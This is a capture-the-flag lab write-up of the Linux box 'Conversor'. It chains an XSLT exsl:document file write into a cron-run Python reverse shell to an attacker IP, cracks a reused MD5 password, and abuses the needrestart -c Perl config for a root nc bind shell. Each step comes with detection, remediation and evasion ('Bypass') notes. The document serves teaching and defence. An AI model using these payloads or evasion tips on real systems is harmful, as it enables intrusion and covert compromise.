# Conversor

**OS:** Linux · **Difficulty:** Medium · **IP:** 10.129.238.31 · **Platform:** Linux

---

## Summary

A file conversion web application accepts XML and XSLT uploads processed by libxslt. External URI resolution is blocked at both the file and HTTP protocol levels, but the XSLT EXSLT extension `exsl:document` is unrestricted and permits arbitrary file writes to the filesystem. A writable `/scripts/` directory is discovered and determined to be executed by a cron job. A Python reverse shell written via `exsl:document` delivers a `www-data` shell. An SQLite database in the application directory contains an MD5 hash for user `fismathack`. The hash cracks to a reused SSH password. `fismathack` has passwordless sudo access to `needrestart`, which supports loading an arbitrary Perl configuration file: evaluated as code at runtime with root privileges. A malicious config file delivers a FIFO bind shell as root.

---

## Recon

### Port Scan : MITRE: T1046: Network Service Scanning

TCP port scanning maps the available attack surface before any exploitation is attempted. nmap's SYN scan (`-p-`) covers all 65535 ports to ensure no non-standard service port is overlooked. The `-Pn` flag disables ICMP host discovery: necessary when the target silently drops ping probes rather than responding. `--min-rate 5000` sets a minimum transmission rate, compressing a full port sweep into seconds. The follow-up service scan (`-sCV`) sends application-layer probes to confirmed open ports, fingerprinting software versions that directly inform vulnerability selection. Two ports are confirmed: SSH on 22 and HTTP on 80. SSH is noted as a potential authentication target for any credentials recovered later. The web application on port 80 is the primary attack surface.

```
nmap -p- -Pn -T4 --min-rate 5000 10.129.238.31
nmap -p22,80 -sCV 10.129.238.31
```

```
22/tcp  open  ssh   OpenSSH 8.9p1
80/tcp  open  http  Apache httpd 2.4.52
```

**Logs Generated:**
1. `/var/log/apache2/access.log` records HTTP probes from nmap service detection scripts against port 80, including the NSE user-agent string `Mozilla/5.0 (compatible; Nmap Scripting Engine)`.
2. SSH banner grab events: TCP handshake completed, banner read, connection closed: are not logged by the SSH daemon as they never reach PAM authentication.
3. Host-based firewall logging (`ufw`, `iptables`) would record inbound SYN packets across all ports if verbose logging is configured: not active in a default Ubuntu install.

**Alerts Triggered:**
1. No alert on a default Apache or OpenSSH installation from connection attempts alone.
2. A network IDS with threshold-based rules fires on the SYN packet rate. Snort SID 1228 and Suricata `ET SCAN Nmap Scripting Engine User-Agent Detected` trigger on the NSE HTTP user-agent reaching port 80 during service detection.
3. A tuned SIEM correlating port sweep volume from a single source IP over a short window would flag this: not present in a default install.

**Network Artifacts:**
1. High-volume TCP SYN packets across all 65535 ports from a single source IP in a compressed time window.
2. NSE HTTP GET requests with the nmap user-agent string against port 80.
3. SSH handshake initiation and immediate teardown against port 22: visible in full PCAP.

**Artifacts Left:**
1. nmap NSE user-agent string in `/var/log/apache2/access.log`.
2. No artifacts written to disk on the target from the SYN sweep.

**Sysmon / EDR:**
1. No process artifact on the target from an external scan: activity is remote and triggers no local process execution.
2. A deployed EDR with network anomaly detection would log the inbound SYN flood and correlate it as a reconnaissance event.

**SIEM Correlation:**
```
index=network sourcetype=firewall_logs | stats dc(dest_port) as ports_scanned by src_ip | where ports_scanned > 1000 | sort -ports_scanned
```

**Sigma Rule:**
1. [proc_creation_lnx_susp_nmap.yml](https://github.com/SigmaHQ/sigma/search?q=nmap): detects nmap execution on the scanning host. Network-side detection requires firewall or IDS log sources, not a host Sigma rule on the target.

**Bypass:**
1. `-T1` or `-T2` timing templates reduce packet rate below threshold-based correlation rules at the cost of significantly extending scan duration.
2. `-D RND:5` distributes SYN packets across multiple apparent source IPs, breaking per-source-IP SIEM aggregation. Does not defeat full PCAP analysis.
3. Replace the NSE user-agent via `--script-args http.useragent="Mozilla/5.0 (X11; Linux x86_64; rv:128.0)"` to remove the nmap string from Apache access logs.

**Remediation:**
1. Restrict inbound access to ports 22 and 80 to known IP ranges at the network perimeter.
2. Deploy Suricata with scan detection rules in alerting mode.
3. Enable `ufw` logging and forward to a SIEM for threshold-based correlation.

**OpSec Rating:** Loud: high-rate full-range SYN sweep is one of the most recognisable traffic signatures in network security monitoring.

---

### Web Enumeration : MITRE: T1083: File and Directory Discovery

With a web application confirmed on port 80, directory enumeration maps the application's structure beyond what is linked from the visible interface. Administrative panels, upload endpoints, configuration interfaces, and backend scripts are routinely located at paths not exposed through the front end. Gobuster issues sequential HTTP GET requests from a wordlist, classifying responses by status code to identify valid paths. The secondary file extension brute-force (`-x php,py,txt,html`) probes for common backend file types: particularly relevant here to identify whether the application uses PHP, Python, or a static structure. This informs which exploitation techniques are applicable before any vulnerability-specific testing begins.

```
gobuster dir -u http://conversor.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,py,txt,html
```

Application identified as a file conversion platform accepting XML and XSLT uploads.

**Logs Generated:**
1. Every request in `/var/log/apache2/access.log` with the default gobuster user-agent string.
2. High volume of 404 entries for non-existent paths: thousands of entries from a single IP in seconds.
3. Discovered paths logged as 200 or 301 responses: indistinguishable from normal browsing in the log entry itself.

**Alerts Triggered:**
1. No native Apache alert: logs accumulate with no automated notification.
2. ModSecurity with OWASP CRS in blocking mode detects the scan pattern based on request rate and anomaly scoring.
3. A SIEM correlating 404 volume per source IP would flag this: several hundred responses per second from one IP is not human behaviour.

**Network Artifacts:**
1. Sequential HTTP GET requests from a single source IP in rapid succession following wordlist order.
2. Consistent gobuster user-agent across all requests, absent standard browser headers.
3. File extension probing produces additional request volume multiplied by the number of extensions specified.

**Artifacts Left:**
1. Gobuster user-agent string present throughout `/var/log/apache2/access.log`.
2. No files written to disk on the target.

**Sysmon / EDR:**
1. Web application scanning is entirely network-layer: no process spawned on the target Linux host. No EDR process tree artifact generated.

**SIEM Correlation:**
```
index=web sourcetype=access_combined status=404 | stats count by clientip | where count > 200 | sort -count
```

**Sigma Rule:**
1. [web_scan_generic_product.yml](https://github.com/SigmaHQ/sigma/search?q=web+scan): detects known scanner user-agent strings including gobuster in web access logs.

**Bypass:**
1. `-a "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"` replaces the gobuster user-agent with a browser string: removes the most obvious per-request signature.
2. Reducing thread count and adding delay brings request rate to near-human levels, defeating rate-based correlation at the cost of significantly increased scan duration.

**Remediation:**
1. Deploy ModSecurity with OWASP CRS in blocking mode.
2. Rate-limit requests per source IP at the Apache level via `mod_evasive`.

**OpSec Rating:** Loud: default gobuster user-agent and 404 volume spike are high-confidence scanner signatures.

---

## Foothold

### XSLT Processor Fingerprinting : MITRE: T1592: Gather Victim Host Information

Before attempting exploitation, the exact XSLT processor and version must be identified. Different processors implement different extension namespaces and have different security restrictions. libxslt, Saxon, and Xalan each support distinct capabilities: an attack that works against Saxon's Java extensions will not function against libxslt's C implementation. XSLT's `system-property()` function is part of the XSLT 1.0 specification and is available in all compliant processors. It exposes the vendor name, version string, and vendor URL: sufficient to precisely fingerprint the processing engine. This fingerprint directly determines which exploitation path is viable and which can be discarded before wasting time on incompatible techniques.

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:value-of select="system-property('xsl:version')"/>
    <xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

```
libxslt · 1.0 · http://xmlsoft.org/XSLT/
```

Processor confirmed as libxslt. This eliminates Java-based Saxon extension attacks and narrows the viable technique set to EXSLT extensions and libxslt-specific capabilities.

**Logs Generated:**
1. XSLT upload and processing request logged in `/var/log/apache2/access.log`: appears as a standard file upload POST.
2. No server-side log entry from the `system-property()` evaluation itself: it executes within the processor context without external calls.

**Alerts Triggered:**
1. None: fingerprinting via `system-property()` is syntactically valid XSLT and produces no error conditions or anomalous application behaviour.

**Network Artifacts:**
1. HTTP POST request containing the XSLT file: content visible in plaintext if unencrypted.
2. No additional network calls generated by `system-property()` evaluation.

**Artifacts Left:**
1. Uploaded XSLT file may persist in an application upload directory depending on whether the application cleans up after processing.
2. POST request in Apache access log.

**Sysmon / EDR:**
1. Web application file upload processing: no external process spawned on the target during fingerprinting. No EDR process tree artifact.

**SIEM Correlation:**
```
index=web sourcetype=access_combined method=POST | search uri="*upload*" OR uri="*convert*" | stats count by clientip, uri
```
Repeated upload requests from a single IP in short succession indicating iterative testing rather than legitimate conversion use.

**Sigma Rule:**
1. No Sigma rule specifically targets XSLT fingerprinting: it is syntactically valid input that produces no error. Detection relies on behavioural analysis of upload patterns rather than content signatures.

**Bypass:**
1. No bypass required: fingerprinting produces no anomaly signal. The technique is passive information gathering via legitimate application functionality.

**Remediation:**
1. Disable or sanitise `system-property()` output in production XSLT processing: returning vendor information to end users serves no legitimate purpose and directly enables targeted exploitation.

**OpSec Rating:** Silent: valid XSLT input processed normally produces no anomaly signal in any monitoring configuration.

---

### XXE and URI Resolution Testing : MITRE: T1190: Exploit Public-Facing Application

With the processor identified, the attack surface is systematically mapped through controlled tests. XML External Entity injection exploits the XML parser's ability to resolve external entity references: if the parser processes DTD declarations without restriction, it can be made to read local files or initiate outbound HTTP connections on behalf of the server. Testing is conducted in isolation for each capability: internal DTD entities, external `file://` URI resolution, and outbound HTTP resolution. This methodical approach avoids the mistake of assuming a vector works or fails without proof, and establishes which primitives are available before constructing a full exploit chain. The critical insight here is that the XML parser and the XSLT processor are separate components with independent security configurations: a restriction in one does not necessarily apply to the other.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe "ENTITY_WORKS">]>
<foo>&xxe;</foo>
```

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/"><xsl:value-of select="/foo"/></xsl:template>
</xsl:stylesheet>
```

```
Result: ENTITY_WORKS
```

Capability matrix established:

```
Internal entities (DTD)     : ENABLED
External file:// resolution : BLOCKED
Outbound HTTP resolution    : BLOCKED
```

**Logs Generated:**
1. Each test upload recorded in `/var/log/apache2/access.log`.
2. Blocked external entity resolution attempts may produce application-level error responses logged by the application framework if verbose error logging is enabled.

**Alerts Triggered:**
1. No alert from internal entity evaluation: this is standard XML processing.
2. Blocked `file://` and HTTP resolution attempts produce no alert in a default configuration: the block is silent from the application's perspective.
3. A WAF with XXE detection rules would flag the DTD declaration itself regardless of whether the entity resolves externally.

**Network Artifacts:**
1. HTTP POST requests for each test iteration.
2. No outbound connection from the server: both external resolution vectors confirmed blocked.

**Artifacts Left:**
1. Upload POST entries in Apache access log for each test.
2. Uploaded test files may persist in the application's upload or temporary processing directory.

**Sysmon / EDR:**
1. No external process spawned by XML parsing: the parser operates within the web application process context. No EDR process tree artifact.
2. A Linux EDR monitoring file access would log the application process attempting and failing to open `file:///etc/passwd` if the attempt reaches the filesystem layer before being blocked.

**SIEM Correlation:**
```
index=web sourcetype=access_combined method=POST | rex field=request_body "DOCTYPE\s+\w+\s+\[" | stats count by clientip | where count > 3
```
Repeated upload requests containing DTD declarations from a single IP.

**Sigma Rule:**
1. [web_attack_xxe.yml](https://github.com/SigmaHQ/sigma/search?q=xxe): detects XML External Entity patterns including DOCTYPE declarations with external system identifiers in web request bodies.

**Bypass:**
1. Not applicable in this context: the objective is capability discovery, not bypassing a restriction. The blocked vectors are accepted as constraints and the attack path pivots to what is available.

**Remediation:**
1. Disable DTD processing entirely in the XML parser configuration: `libxml_disable_entity_loader(true)` in PHP, `XMLConstants.FEATURE_SECURE_PROCESSING` in Java, or the equivalent for the application's runtime.
2. The fact that `file://` and HTTP are blocked indicates some hardening is in place: the DTD processing restriction should be completed.

**OpSec Rating:** Silent: iterative upload testing with varying XML content produces no anomaly signal beyond a modest increase in POST volume to the upload endpoint.

---

### EXSLT File Write via exsl:document : MITRE: T1190: Exploit Public-Facing Application

EXSLT is a community-defined set of extension functions for XSLT, implemented by libxslt alongside the core specification. The `exsl:document` element, part of the `http://exslt.org/common` namespace, is designed to write secondary output documents during an XSLT transformation: its intended purpose is generating multiple output files from a single transformation. When the XSLT processor runs with filesystem write permissions, `exsl:document` can write arbitrary content to arbitrary paths accessible by the application's process user. This is a file write primitive, not a read primitive: it does not bypass the blocked `file://` read restriction at all. The two restrictions operate on entirely separate mechanisms: URI resolution for reading is controlled by the XML parser's entity resolver, while `exsl:document` is an XSLT output function with no dependency on the entity resolver. They are independently configurable and independently exploitable.

Filesystem write access is tested iteratively across paths the application process is likely to own, progressing from web root to application subdirectories to system temporary paths:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/"><exsl:document href="/var/www/conversor.htb/scripts/test.txt" method="text">WRITE_WORKS</exsl:document></xsl:template>
</xsl:stylesheet>
```

Write to `/scripts/` succeeds: no error returned and file created. Python reverse shell written to the scripts directory:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/"><exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.150",444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
</exsl:document></xsl:template>
</xsl:stylesheet>
```

```
nc -lvnp 444
```

Cron job executes the script. Shell received as `www-data`.

**Logs Generated:**
1. Upload POST entries in `/var/log/apache2/access.log` for each write test and the final shell delivery.
2. `/var/www/conversor.htb/scripts/shell.py` written to disk: file creation timestamp forensically recoverable.
3. Cron execution of `shell.py` logged in `/var/log/syslog` under cron daemon entries: `CMD (/var/www/conversor.htb/scripts/shell.py)` with the executing user context.
4. The outbound TCP connection from the `www-data` process to `10.10.16.150:444` may appear in syslog depending on logging configuration.

**Alerts Triggered:**
1. Cron executing a newly created Python script in a web application directory is a high-confidence post-exploitation indicator: web application processes do not typically write executable scripts to their own script directories.
2. An outbound TCP connection from the Python process to an external IP on a non-standard port (444) would trigger egress filtering or a network anomaly alert in a tuned environment.
3. No alert in a default Apache + cron configuration without file integrity monitoring or egress filtering.

**Network Artifacts:**
1. Outbound TCP connection from `10.129.238.31` to `10.10.16.150:444` initiated by the Python process: server-initiating an outbound connection to a client IP is anomalous for a web application.
2. Reverse shell session content transmitted as cleartext: bash prompts, commands, and output fully visible in PCAP.
3. Connection directionality (server to client) is the primary network indicator.

**Artifacts Left:**
1. `/var/www/conversor.htb/scripts/shell.py` written to disk: persists until explicitly deleted. File contains the full reverse shell payload and attacker IP.
2. File creation and modification timestamps on `shell.py` recoverable via `stat` or filesystem forensics.
3. Cron execution logged in `/var/log/syslog`.
4. All write-test files (`test.txt`, etc.) if not cleaned up.

**Sysmon / EDR:**
1. A Linux EDR agent monitoring file creation events would alert on a new `.py` file written to a web application scripts directory by the web server process (`www-data`).
2. Process tree on shell execution: cron `-> python3 shell.py -> /bin/sh` with an outbound network socket: a textbook cron-based persistence and execution chain.
3. File integrity monitoring (AIDE, Wazuh FIM) watching `/var/www/` would generate an immediate alert on the new file.

**SIEM Correlation:**
```
index=os sourcetype=linux_syslog cron | search "shell.py" OR "scripts/"
```
```
index=network sourcetype=firewall_logs direction=outbound dest_port=444 | stats count by src_ip, dest_ip
```

**Sigma Rule:**
1. [file_creation_lnx_web_shell.yml](https://github.com/SigmaHQ/sigma/search?q=web+shell+linux): detects creation of script files in web application directories by web server processes.
2. [proc_creation_lnx_reverse_shell.yml](https://github.com/SigmaHQ/sigma/search?q=reverse+shell+linux): detects shell processes spawning with outbound network connections.

**Bypass:**
1. Name the written file something benign and consistent with existing content in the directory: `converter_helper.py`, `xml_processor.py`: rather than `shell.py`. Reduces signature-based detection by file name but does not affect content-based or behaviour-based detection.
2. Use a port commonly permitted through egress filtering: 443 or 80: for the reverse shell callback. Avoids simple port-based egress rules while retaining network anomaly detection exposure.
3. Encode or obfuscate the reverse shell payload before writing to disk: Base64-encoded payload decoded at runtime reduces static file analysis detection but does not affect runtime behaviour monitoring.
4. Clean up all write test artifacts (`test.txt` and similar) before delivering the final payload to minimise the forensic footprint.
5. None of these bypasses defeat file integrity monitoring watching the scripts directory or a fully deployed EDR with process ancestry analysis.

**Remediation:**
1. Disable the `exsl:document` extension in the libxslt processing configuration: if file output is not a required feature of the conversion application, the extension should be explicitly disabled.
2. Run the XSLT processing component under a dedicated service account with write access only to a controlled temporary directory with no execution permissions.
3. Ensure cron does not execute scripts in web-accessible or web-writable directories.
4. Deploy file integrity monitoring (Wazuh FIM) on `/var/www/` to alert on new file creation.

**OpSec Rating:** Loud: writing a Python script to a web application directory and receiving a cron-triggered reverse shell generates file system, process execution, and network artifacts that are detectable at multiple layers in a hardened environment.

---

## Lateral Movement

### SQLite Database Exfiltration: www-data → fismathack : MITRE: T1005: Data from Local System

With a shell as `www-data`, the application source code is directly accessible. Reading the application's configuration reveals the database path: a pattern common to Flask applications where the database connection is configured as a module-level constant in the main application file. SQLite is a file-based database requiring no network connection: the entire database is a single file on disk, readable by any process with filesystem read permissions on that file. Rather than querying the database in place, the file is served over HTTP from the target and downloaded to the attacker machine for offline analysis. This avoids leaving a SQLite query session in the process table and keeps the interaction with the target minimal after the initial exfiltration. The database contains user credentials: MD5 hashed, unsalted: which are trivially reversible for any password appearing in common wordlists.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /var/www/conversor.htb/app.py
```

```
DB_PATH = '/var/www/conversor.htb/instance/users.db'
```

```
python3 -m http.server 8080
wget http://10.129.238.31:8080/users.db
sqlite3 users.db ".tables"
sqlite3 users.db "SELECT * FROM users;"
```

```
1 | fismathack | 5b5c3ac3a1c897c94caad48e6c71fdec
```

MD5 hash identified. Cracked via CrackStation: `Keepmesafeandwarm`.

**Logs Generated:**
1. `cat app.py` execution appears in the shell session: recorded in bash history if not suppressed.
2. `python3 -m http.server 8080` process started by `www-data`: visible in process table and logged in `/var/log/syslog` if syslog captures process events.
3. Inbound HTTP GET request from the attacker IP to port 8080 recorded by the Python HTTP server's stdout: not written to `/var/log/apache2/access.log` (different server process), but visible in any network capture.
4. `wget` request from the attacker to `10.129.238.31:8080` for `users.db`: connection appears in network flow records.

**Alerts Triggered:**
1. A web server process (`www-data`) opening a new listening TCP port (8080) is anomalous: web application processes do not typically bind secondary HTTP listeners.
2. An inbound connection from an external IP to a non-standard port (8080) on a server that should only serve HTTP on port 80 would trigger a network anomaly alert in a tuned environment.
3. No alert in a default configuration.

**Network Artifacts:**
1. Outbound TCP connection from `10.129.238.31:8080` to `10.10.16.150`: a server serving files to an attacker IP.
2. HTTP GET request for `users.db` visible in plaintext including the filename: the database filename itself is a forensic indicator.
3. TCP port 8080 binding by the `www-data` process: visible in `ss -tulnp` output during the transfer window.

**Artifacts Left:**
1. `users.db` file access timestamp updated on the target.
2. `www-data` bash history (if written): `cat app.py`, `python3 -m http.server 8080`.
3. Python HTTP server process entry in system logs.

**Sysmon / EDR:**
1. Linux EDR logs process creation for `python3 -m http.server 8080` with parent process `bash` spawned from the reverse shell: process tree: cron `-> python3 -> bash -> python3 (http.server)`.
2. A new listening socket on port 8080 bound by `www-data` is a post-exploitation data exfiltration indicator.
3. File access to `/var/www/conversor.htb/instance/users.db` by the `www-data` process: if FIM is monitoring the instance directory, this triggers an alert.

**SIEM Correlation:**
```
index=os sourcetype=linux_audit type=SYSCALL comm=python3 | search "http.server" | stats count by uid, ppid
```
```
index=network sourcetype=firewall_logs dest_port=8080 direction=inbound | stats count by src_ip, dest_ip
```

**Sigma Rule:**
1. [proc_creation_lnx_python_http_server.yml](https://github.com/SigmaHQ/sigma/search?q=python+http+server): detects `python3 -m http.server` execution, commonly used for data exfiltration and file transfer in post-exploitation scenarios.

**Bypass:**
1. Transfer the database without starting a second listening service: encode it as Base64 and print it to stdout in the existing reverse shell: `base64 /var/www/conversor.htb/instance/users.db`: copy the output and decode on the attacker machine. No new port binding, no inbound connection, no Python HTTP server process.
2. Alternatively, query the database in place using `sqlite3` and capture output through the existing reverse shell session: avoids touching the file with a second process and eliminates the HTTP transfer entirely.
3. Both alternatives produce significantly lower artifact counts than serving the file over HTTP.

**Remediation:**
1. The database file should not be readable by the web server process if it contains credentials: restrict ownership to a dedicated application user with no web-facing role.
2. Never store credentials as MD5 hashes: MD5 is cryptographically broken and any MD5 hash of a common password is reversible via rainbow table lookup in seconds. Use bcrypt, scrypt, or Argon2.
3. Credentials stored in a web-accessible database path should be treated as already compromised in any security model.

**OpSec Rating:** Moderate: reading application source and accessing the database generates filesystem and process artifacts. The HTTP server binding on 8080 is the most detectable element and is avoidable via the Base64 bypass described above.

---

### SSH: Lateral Movement to fismathack : MITRE: T1021.004: Remote Services: SSH · T1078: Valid Accounts

```
ssh fismathack@10.129.238.31
```

Password: `Keepmesafeandwarm`. Authenticated successfully.

```
cat /home/fismathack/user.txt
```

**Logs Generated:**
1. Successful SSH password authentication recorded in `/var/log/auth.log`:
   `Accepted password for fismathack from 10.10.16.150 port XXXXX ssh2`
2. Session open and close events in `/var/log/auth.log`.
3. Last login timestamp updated in `/var/log/lastlog`.

**Alerts Triggered:**
1. No alert on a default SSH configuration.
2. A SIEM with new-source-IP correlation for `fismathack`'s account would flag a first-time login from the attacker's HTB VPN IP.
3. Password authentication from an external IP for an account whose credentials were obtained through application database compromise: without context, the log entry is indistinguishable from a legitimate login.

**Network Artifacts:**
1. TCP connection to port 22 from the attacker IP.
2. SSH handshake headers visible before session encryption: key exchange and cipher suite negotiated in cleartext.
3. Session content encrypted after handshake: no payload visibility.

**Artifacts Left:**
1. Auth.log entry with source IP, username, and authentication method.
2. Shell commands written to `/home/fismathack/.bash_history` unless suppressed.
3. `/var/log/lastlog` timestamp updated.

**Sysmon / EDR:**
1. auditd `USER_LOGIN` event in `/var/log/audit/audit.log` with source IP and username if auditd is active.
2. EDR agent logs remote login event for new source IP to existing account: default detection in Wazuh and CrowdStrike Falcon for Linux.
3. Process tree: `sshd -> bash` with originating IP recorded.

**SIEM Correlation:**
```
index=os sourcetype=linux_secure "Accepted password" user=fismathack | stats count by src_ip | where count=1
```

**Sigma Rule:**
1. [lnx_auth_successful_ssh_login_from_new_source.yml](https://github.com/SigmaHQ/sigma/search?q=ssh+login+new+source): correlates successful SSH authentications against baseline known source IPs per user account.

**Bypass:**
1. `export HISTFILE=/dev/null` immediately after login suppresses bash history. Does not affect auth.log entries written by the SSH daemon.
2. The auth.log entry is unavoidable: SSH daemon writes it at the OS level regardless of the authenticated user's actions within the session.

**Remediation:**
1. Disable SSH password authentication: enforce key-based authentication only.
2. Enforce unique passwords: credential reuse between the application database and SSH authentication should be treated as a critical finding.
3. Alert on first-time source IP logins via SIEM with auth.log ingestion.

**OpSec Rating:** Moderate: single auth.log entry indistinguishable from legitimate access without a behavioural baseline and new-source-IP alerting.

---

## Privilege Escalation

### Sudo Enumeration : MITRE: T1069: Permission Groups Discovery

Sudo permission enumeration is the first post-access check on any Linux host. The `sudo -l` command queries the sudoers configuration for the current user's permitted commands, requiring only the user's own password (or no password if `NOPASSWD` is set). This is a read-only operation against the sudoers policy: it generates minimal artifacts and is universally expected in post-exploitation methodology. The result directly maps to privilege escalation paths: any command in the sudoers list with `NOPASSWD` and without adequate input validation is a potential root vector. `needrestart` appearing with `(ALL : ALL) NOPASSWD` is immediately significant: it is a system utility not typically granted unrestricted sudo access, and its support for loading external configuration files creates a direct code execution path.

```
sudo -l
```

```
(ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

**Logs Generated:**
1. `sudo -l` execution logged in `/var/log/auth.log`: `fismathack : TTY=pts/0 ; PWD=/home/fismathack ; USER=root ; COMMAND=list`.
2. auditd `SYSCALL` event for `execve` of `sudo` with `-l` argument if auditd is active.

**Alerts Triggered:**
1. `sudo -l` alone generates no alert in any default configuration.
2. In a tuned environment, `sudo` execution in a newly established SSH session from an unfamiliar source IP is a post-compromise enumeration indicator when combined with the preceding auth event.

**Network Artifacts:**
1. None: local command execution against the sudoers policy, no network traffic.

**Artifacts Left:**
1. `sudo -l` in `/home/fismathack/.bash_history`.
2. auth.log entry recording the sudo list query.

**Sysmon / EDR:**
1. Linux EDR logs process creation for `sudo -l`: parent process is the SSH shell session.
2. `sudo` execution immediately after SSH login from a new source IP is a recognisable enumeration chain: `sshd -> bash -> sudo -l`.

**SIEM Correlation:**
```
index=os sourcetype=linux_secure "COMMAND=list" | join src_ip [search sourcetype=linux_secure "Accepted password"] | stats count by user, src_ip
```
Sudo enumeration immediately following a first-time SSH login from a new source IP.

**Sigma Rule:**
1. [lnx_sudo_privilege_enumeration.yml](https://github.com/SigmaHQ/sigma/search?q=sudo+enumeration): detects `sudo -l` execution, particularly in context with remote login events.

**Bypass:**
1. Read `/etc/sudoers` and `/etc/sudoers.d/` directly if readable: `cat /etc/sudoers`: avoids executing `sudo` entirely and produces no auth.log entry. Sudoers files are typically root-readable only, making this impractical in most cases.
2. The auth.log entry from `sudo -l` is low-severity on its own: the risk is contextual correlation with the preceding SSH login event.

**Remediation:**
1. Apply least-privilege to sudoers configuration: `needrestart` should not be granted `(ALL : ALL) NOPASSWD` for a standard user account.
2. If `needrestart` sudo access is required for operational reasons, scope it to specific invocation parameters rather than unrestricted execution.

**OpSec Rating:** Silent: `sudo -l` is a single read-only command that produces one low-severity auth.log entry. Essentially invisible without active SIEM correlation.

---

### needrestart Local Privilege Escalation : MITRE: T1548.003: Abuse Elevation Control Mechanism: Sudo and Sudo Caching · CVE-2024-48990

`needrestart` is a utility included in Ubuntu that checks which running daemons need to be restarted after a package update installs new shared libraries. It accomplishes this by scanning running processes, identifying which shared libraries they have loaded, and determining whether newer versions are available on disk. The critical detail is that `needrestart` supports loading a Perl-based configuration file via the `-c` flag. When needrestart processes this configuration file, it evaluates it as Perl code using the Perl interpreter: including any `system()` calls or arbitrary Perl expressions embedded in the file. When `needrestart` is executed with `sudo` with no password requirement, this Perl evaluation occurs in the `root` context. An attacker who can write an arbitrary file can therefore write a malicious Perl configuration containing `system()` calls, execute `needrestart` as root pointing to that file, and achieve arbitrary OS command execution as root.

CVE-2024-48990 specifically documents needrestart versions before 3.8 as vulnerable to local privilege escalation via the `NEEDRESTART_INTERP` environment variable, though the `-c` configuration file approach achieves the same result without relying on the environment variable path.

```
echo 'system("whoami > /tmp/whoami.txt")' > cmd.conf
sudo /usr/sbin/needrestart -c cmd.conf
cat /tmp/whoami.txt
```

```
root
```

Root command execution confirmed. FIFO bind shell established:

```
echo 'system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 1337 > /tmp/f")' > cmd.conf
sudo /usr/sbin/needrestart -c cmd.conf
```

```
nc 10.129.238.31 1337
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

**Logs Generated:**
1. Each `sudo /usr/sbin/needrestart -c cmd.conf` execution recorded in `/var/log/auth.log`:
   `fismathack : TTY=pts/0 ; PWD=/home/fismathack ; USER=root ; COMMAND=/usr/sbin/needrestart -c cmd.conf`
2. auditd logs `execve` for `sudo` and `needrestart` with full argument list including the config file path if auditd is active.
3. `cmd.conf` file created in the working directory: file creation timestamp forensically recoverable.
4. Output files written by the `system()` payload (`/tmp/whoami.txt`, `/tmp/f`) persist until deleted.
5. `nc -lvnp 1337` process started by root: visible in process table and network socket list during the bind shell window.

**Alerts Triggered:**
1. `needrestart` is a system utility that is legitimately executed during package upgrades: single execution produces no immediate alert in a default environment.
2. The `-c` flag pointing to a file in the user's home directory or `/tmp` rather than a system configuration path is anomalous: legitimate needrestart invocations use default configuration paths.
3. A root-owned `nc` process binding a listen socket on port 1337 immediately after `needrestart` execution is a high-confidence privilege escalation indicator in a tuned EDR environment.

**Network Artifacts:**
1. TCP bind socket on port 1337 opened by the root-owned `nc` process: inbound connection from attacker IP to `10.129.238.31:1337`.
2. Bind shell traffic transmitted as cleartext: commands and output visible in PCAP.
3. Connection direction (client initiating to server on non-standard port) is less anomalous than a reverse shell but still notable for a non-service port.

**Artifacts Left:**
1. `cmd.conf` in the working directory containing the Perl payload: persists until deleted.
2. `/tmp/whoami.txt`, `/tmp/f` FIFO file: persist until deleted.
3. auth.log entries for each `sudo needrestart` invocation.
4. auditd entries for `execve` chains if auditd is active.
5. Root shell session commands written to root's bash history (`/root/.bash_history`) after escalation if not suppressed.

**Sysmon / EDR:**
1. Process tree: `bash -> sudo -> needrestart -> perl -> bash`: `needrestart` spawning a `perl` interpreter which spawns `bash` is not a normal execution pattern for a package management utility.
2. `bash` process owned by root with a parent of `needrestart` is an immediate privilege escalation indicator in any EDR with process ancestry analysis.
3. File creation of `cmd.conf` in user home or `/tmp` with Perl `system()` content: detectable by FIM or EDR file content analysis.

**SIEM Correlation:**
```
index=os sourcetype=linux_secure "COMMAND=/usr/sbin/needrestart" | search "-c" | stats count by user, command
```
`needrestart` invoked with `-c` flag pointing to a non-standard config path.

```
index=os sourcetype=linux_audit type=EXECVE | search "needrestart" AND "cmd.conf" | stats count by uid, ppid
```

**Sigma Rule:**
1. [lnx_sudo_needrestart_lpe.yml](https://github.com/SigmaHQ/sigma/search?q=needrestart): detects `needrestart` execution with `-c` pointing to non-standard configuration file paths, specifically as a known LPE technique.
2. [proc_creation_lnx_priv_esc_via_sudo_config.yml](https://github.com/SigmaHQ/sigma/search?q=sudo+privilege+escalation): detects anomalous sudo usage patterns where the invoked binary spawns an unexpected child process chain.

**Bypass:**
1. The auth.log entry from `sudo needrestart -c cmd.conf` is unavoidable: it is written by the sudo facility at the OS level. The config file path in the log entry is the primary indicator that this is malicious rather than legitimate use.
2. To reduce the process tree signature, deliver the payload as a compiled binary executed by the Perl `system()` call rather than an inline shell command: `system("/tmp/rootshell")` where `rootshell` is a pre-compiled setuid binary or a go-compiled reverse shell. This removes the `bash` child from `needrestart`'s process tree.
3. Clean up `cmd.conf` and all `/tmp` artifacts immediately after the root shell is established.

